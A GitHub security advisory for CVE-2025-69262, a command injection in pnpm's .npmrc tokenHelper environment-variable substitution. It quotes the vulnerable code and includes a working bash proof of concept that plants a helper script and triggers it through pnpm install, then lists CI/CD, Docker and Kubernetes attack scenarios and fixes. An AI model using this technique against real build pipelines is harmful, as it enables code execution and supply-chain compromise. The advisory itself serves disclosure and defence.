# [H] pnpm vulnerable to Command Injection via environment variable substitution

## Summary
Severity: High
Advisory: GHSA-2phv-j68v-wwqx
CVE: CVE-2025-69262
CWE: CWE-78, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-01-07
Source: https://github.com/advisories/GHSA-2phv-j68v-wwqx
Type: github-advisory

## Affected
- npm: `pnpm` — affected >=6.25.0 <10.27.0

## Details
## Summary

A command injection vulnerability exists in pnpm when using environment variable substitution in `.npmrc` configuration files with `tokenHelper` settings. An attacker who can control environment variables during pnpm operations could achieve remote code execution (RCE) in build environments.

## Affected Components

- **Package**: pnpm
- **Versions**: All versions using `@pnpm/config.env-replace` and `loadToken` functionality
- **File**: `pnpm/network/auth-header/src/getAuthHeadersFromConfig.ts` - `loadToken()` function
- **File**: `pnpm/config/config/src/readLocalConfig.ts` - `.npmrc` environment variable substitution

## Technical Details

### Vulnerability Chain

1. **Environment Variable Substitution**
   - `.npmrc` supports `${VAR}` syntax
   - Substitution occurs in `readLocalConfig()`

2. **loadToken Execution**
   - Uses `spawnSync(helperPath, { shell: true })`
   - Only validates absolute path existence

3. **Attack Flow**
```
.npmrc: registry.npmjs.org/:tokenHelper=${HELPER_PATH}
   ↓
envReplace() → /tmp/evil-helper.sh
   ↓
loadToken() → spawnSync(..., { shell: true })
   ↓
RCE achieved
```

### Code Evidence

**`pnpm/config/config/src/readLocalConfig.ts:17-18`**
```typescript
key = envReplace(key, process.env)
ini[key] = parseField(types, envReplace(val, process.env), key)
```

**`pnpm/network/auth-header/src/getAuthHeadersFromConfig.ts:60-71`**
```typescript
export function loadToken(helperPath: string, settingName: string): string {
  if (!path.isAbsolute(helperPath) || !fs.existsSync(helperPath)) {
    throw new PnpmError('BAD_TOKEN_HELPER_PATH', ...)
  }
  const spawnResult = spawnSync(helperPath, { shell: true })
  // ...
}
```

## Proof of Concept

### Prerequisites
- Private npm registry access
- Control over environment variables
- Ability to place scripts in filesystem

### PoC Steps

```bash
# 1. Create malicious helper script
cat > /tmp/evil-helper.sh << 'SCRIPT'
#!/bin/bash
echo "RCE SUCCESS!" > /tmp/rce-log.txt
echo "TOKEN_12345"
SCRIPT
chmod +x /tmp/evil-helper.sh

# 2. Create .npmrc with environment variable
cat > .npmrc << 'EOF'
registry=https://registry.npmjs.org/
registry.npmjs.org/:tokenHelper=${HELPER_PATH}
EOF

# 3. Set environment variable (attacker controlled)
export HELPER_PATH=/tmp/evil-helper.sh

# 4. Trigger pnpm install
pnpm install  # RCE occurs during auth

# 5. Verify attack
cat /tmp/rce-log.txt
```

### PoC Results
```
==> Attack successful
==> File created: /tmp/rce-log.txt
==> Arbitrary code execution confirmed
```

## Impact

### Severity
- **CVSS Score**: 7.6 (High)
- **CVSS Vector**: cvss:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H

### Affected Environments

**High Risk:**
- CI/CD pipelines (GitHub Actions, GitLab CI)
- Docker build environments
- Kubernetes deployments
- Private registry users

**Low Risk:**
- Public registry only
- Production runtime (no pnpm execution)
- Static sites

### Attack Scenarios

**Scenario 1: CI/CD Supply Chain**
```
Repository → Build Trigger → pnpm install → RCE → Production Deploy
```

**Scenario 2: Docker Build**
```dockerfile
FROM node:20
ARG HELPER_PATH=/tmp/evil
COPY .npmrc .
RUN pnpm install  # RCE
```

**Scenario 3: Kubernetes**
```
Secret Control → Env Variable → .npmrc Substitution → RCE
```

## Mitigation

### Temporary Workarounds

**Disable tokenHelper:**
```ini
# .npmrc
# registry.npmjs.org/:tokenHelper=${HELPER_PATH}
```

**Use direct tokens:**
```ini
//registry.npmjs.org/:_authToken=YOUR_TOKEN
```

**Audit environment variables:**
- Review CI/CD env vars
- Restrict .npmrc changes
- Monitor build logs

### Recommended Fixes

1. Remove `shell: true` from loadToken
2. Implement helper path allowlist
3. Validate substituted paths
4. Consider sandboxing

## Disclosure

- **Discovery**: 2025-11-02
- **PoC**: 2025-11-02
- **Report**: [Pending disclosure decision]

## References

- Repository: https://github.com/pnpm/pnpm
- Affected: `@pnpm/config.env-replace@^3.0.2`
- Similar: CVE-2024-53866, CVE-2023-37478

## Credit

Reported by: Jiyong Yang
Contact: sy2n0@naver.com

## References
- https://github.com/pnpm/pnpm/security/advisories/GHSA-2phv-j68v-wwqx
- https://nvd.nist.gov/vuln/detail/CVE-2025-69262
- https://github.com/pnpm/pnpm
- https://github.com/pnpm/pnpm/releases/tag/v10.27.0
